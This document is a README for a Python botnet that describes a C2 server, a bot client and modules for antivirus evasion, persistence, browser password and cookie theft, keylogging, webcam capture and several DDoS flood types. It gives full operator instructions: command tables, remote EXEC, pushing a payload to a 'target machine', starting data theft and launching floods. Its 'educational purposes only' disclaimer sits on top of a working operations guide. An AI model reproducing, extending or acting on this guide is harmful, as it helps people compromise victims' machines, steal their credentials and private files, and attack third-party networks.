# 🚀 ULTRA-PRO BOTNET - Complete Guide

## 📋 Table of Contents
1. [Introduction](#introduction)
2. [System Architecture](#system-architecture)
3. [File Structure](#file-structure)
4. [Installation](#installation)
5. [C2 Server Commands](#c2-server-commands)
6. [Bot Client](#bot-client)
7. [Modules](#modules)
8. [Usage Steps](#usage-steps)
9. [Security & Warnings](#security--warnings)
10. [Troubleshooting](#troubleshooting)

---

## 📖 Introduction

**Ultra-Pro Botnet** is a fully featured C2 (Command & Control) server and bot client system. Built with Python, it's extensible through various modules and provides a complete botnet management solution.

### 🔑 Key Features:
- 🔐 **Encrypted Communication** - All data is encrypted
- 🎨 **Colorful Console** - Beautiful UI with Colorama
- 📁 **Auto Data Extraction** - Automatically extracts stolen data
- 🔄 **Auto-Update** - Bots update automatically
- 💣 **DDoS Attack** - Multiple DDoS attack types supported
- 🕵️ **Tor Support** - Anonymous communication via Tor relay
- 📊 **Dynamic List** - Shows detailed bot information

---

## 🏗️ System Architecture
┌─────────────────────────────────────────────────────────────┐
│ C2 SERVER (c2_server.py) │
│ ┌─────────────────────────────────────────────────────┐ │
│ │ Admin Console (CLI) │ │
│ │ - broadcast <cmd> - list - bot <number> │ │
│ │ - DOWNLOAD <file> - UPDATE - DDOS │ │
│ │ - STEAL - TOR_START - SHOW_STEAL │ │
│ └─────────────────────────────────────────────────────┘ │
│ │ │
│ ┌─────▼─────┐ │
│ │ Socket │ │
│ │ Server │ │
│ │ (Port 4444)│ │
│ └─────┬─────┘ │
│ │ │
│ ┌───────────┼───────────┐ │
│ ▼ ▼ ▼ │
│ ┌──────┐ ┌──────┐ ┌──────┐ │
│ │ Bot1 │ │ Bot2 │ │ Bot3 │ │
│ └──────┘ └──────┘ └──────┘ │
└─────────────────────────────────────────────────────────────┘
│
▼
┌─────────────────────────────────────────────────────────────┐
│ BOT CLIENTS (bot_client.py) │
│ ┌─────────────────────────────────────────────────────┐ │
│ │ Features │ │
│ │ - Data Steal - DDoS Attack - Tor Relay │ │
│ │ - Auto-Update - Persistence - AV Evasion │ │
│ └─────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────┘

text

---

## 📁 File Structure
your_project_folder/
│
├── 📄 c2_server.py # C2 Server (Command Center)
├── 📄 bot_client.py # Bot Client (Target Machine)
├── 📄 config.py # Configuration File
├── 📄 requirements.txt # Required Packages
│
├── 📁 modules/ # All Modules
│ ├── 📄 anti_av.py # Antivirus Evasion
│ ├── 📄 auto_update.py # Auto-Update System
│ ├── 📄 data_steal.py # Data Stealing Module
│ ├── 📄 ddos.py # DDoS Attack Module
│ ├── 📄 encryption.py # Encryption Module
│ ├── 📄 persistence.py # Persistence (Startup)
│ └── 📄 tor_relay.py # Tor Relay Module
│
├── 📁 steal_data/ # C2 Steal Data Storage
├── 📁 extracted_data/ # Extracted Data Storage
├── 📁 steal_data_bot/ # Bot Steal Data Storage
└── 📁 extracted_data_bot/ # Bot Extracted Data Storage

text

---

## 🔧 Installation

### Step 1: Install Required Packages
```bash
pip install -r requirements.txt
requirements.txt:
text
colorama
cryptography
requests
pypiwin32
psutil
Step 2: Start C2 Server
bash
python c2_server.py
Step 3: Start Bot Client
bash
python bot_client.py
💻 C2 Server Commands
Basic Commands:
Command	Description	Example
help	Shows help message	help
dir / ls	Lists C2 folder files	dir
list	Shows connected bots	list
bot <number>	Shows bot details	bot 1
refresh	Refreshes bot list	refresh
stats	Shows server statistics	stats
status	Shows feature status	status
Feature Toggle:
Command	Description
steal_on	Enable Data Steal
steal_off	Disable Data Steal
ddos_on	Enable DDoS
ddos_off	Disable DDoS
tor_on	Enable Tor
tor_off	Disable Tor
Operational Commands:
Command	Description	Example
DOWNLOAD <file>	Download file	DOWNLOAD bot_client.py
UPDATE	Update bots	UPDATE
DDOS <ip> <port> <duration> <type>	DDoS attack	DDOS 192.168.1.1 80 60 SYN
STEAL	Start data theft	STEAL
STOP_STEAL	Stop data theft	STOP_STEAL
TOR_START	Start Tor	TOR_START
TOR_STOP	Stop Tor	TOR_STOP
TOR_INFO	Get Tor info	TOR_INFO
SHOW_STEAL	Show steal data	SHOW_STEAL
LATEST_STEAL	Show latest steal file	LATEST_STEAL
Admin Commands:
Command	Description	Example
broadcast <msg>	Broadcast to all bots	broadcast PING
create_update	Create update file	create_update
upload_update <file>	Upload update	upload_update bot_v2.py
debug on/off	Toggle debug	debug on
quit / exit	Shutdown server	quit
🤖 Bot Client
Bot Features:
🔑 Dynamic Session Key - New key generated each session

🔐 Encrypted Communication - All data encrypted

📁 Auto Data Extraction - Automatically extracts stolen data

🔄 Auto-Update - Checks for updates every hour

🕵️ Anti-AV - Antivirus evasion techniques

💾 Persistence - Adds to startup

🌐 Tor Support - Tor relay connection

Bot Commands (Sent from C2):
Command	Description
PING	Ping response
PONG	Pong response
LIST	Shows bot info
UPDATE	Check for updates
EXEC <cmd>	Execute command
STEAL	Start data theft
STOP_STEAL	Stop data theft
DDOS <ip> <port> <duration>	DDoS attack
TOR_START	Start Tor
TOR_STOP	Stop Tor
TOR_INFO	Tor information
DOWNLOAD <file>	Download file
EXIT	Shutdown bot
🧩 Modules
1. anti_av.py - Antivirus Evasion
Windows Defender bypass

Process hiding

Sandbox detection

2. auto_update.py - Auto-Update
Hourly update checks

Manual update trigger

Download and install updates

3. data_steal.py - Data Theft
Browser password theft (Chrome, Edge, Brave, Firefox)

Cookie theft

History theft

Key-logging

Screenshot capture

Webcam capture

File mining (Images, Videos, Documents, Audio)

4. ddos.py - DDoS Attack
SYN Flood

UDP Flood

HTTP Flood

ICMP Flood

5. encryption.py - Encryption
AES encryption

Encrypt/Decrypt data

Session key generation

6. persistence.py - Persistence
Windows startup addition

Service creation

Run key addition

7. tor_relay.py - Tor Relay
Tor process management

Anonymous connection

.onion site support

🎯 Usage Steps (Step by Step)
Step 1: Start C2 Server
bash
python c2_server.py
Step 2: Start Bot Client
bash
# On target machine
python bot_client.py
Step 3: Check Connected Bots
bash
💻 C2> list
# Output: Bot #1 | 192.168.1.100:54321 | 🟢 Online
Step 4: Download File
bash
💻 C2> bot 1
💻 C2> DOWNLOAD payload.exe
Step 5: Run Commands
bash
💻 C2> bot 1
💻 C2> EXEC payload.exe
💻 C2> EXEC dir
💻 C2> EXEC type text.txt
Step 6: Launch DDoS Attack
bash
💻 C2> DDOS 192.168.1.1 80 60 SYN
Step 7: Steal Data
bash
💻 C2> STEAL
💻 C2> SHOW_STEAL
Step 8: Update Bot
bash
💻 C2> create_update
💻 C2> broadcast UPDATE
🔐 Security & Warnings
⚠️ Important Warnings:
Educational Purpose Only - This tool is for research and education only

Get Permission - Always get owner permission before testing

Follow Laws - Comply with your local laws

Personal Use - Test only on personal systems

🔒 Security Tips:
Change C2 IP and Port

Change encryption keys

Check log files regularly

Use Tor for anonymity

📊 Logging & Monitoring
C2 Logs:
bash
# View C2 logs
💻 C2> dir
💻 C2> type botnet.log
Bot Logs:
bash
# View bot logs
💻 C2> bot 1
💻 C2> EXEC type botnet.log
🛠️ Troubleshooting
Common Issues & Solutions:
Issue	Solution
C2 not connecting	Check if C2 is running
File not downloading	Check if file exists in C2 folder
Bot disconnecting	Check network connection
Update not working	Check modules/auto_update.py
📝 Quick Reference
Quick Commands:
bash
# Start C2
python c2_server.py

# Start Bot
python bot_client.py

# Download file
DOWNLOAD bot_client.py

# Run command
EXEC dir

# DDoS attack
DDOS 192.168.1.1 80 60 SYN

# Start stealing
STEAL

# Show bots
list

# Show help
help
📞 Support
Documentation:
This README file

Code comments

help command in C2

Log Files:
botnet.log - C2 logs

bot_client.log - Bot logs

📜 License
Educational purposes only. User responsibility.

🎉 Final Words
This Botnet system is fully featured and extensible. You can add new modules as needed. Always use legally and ethically!
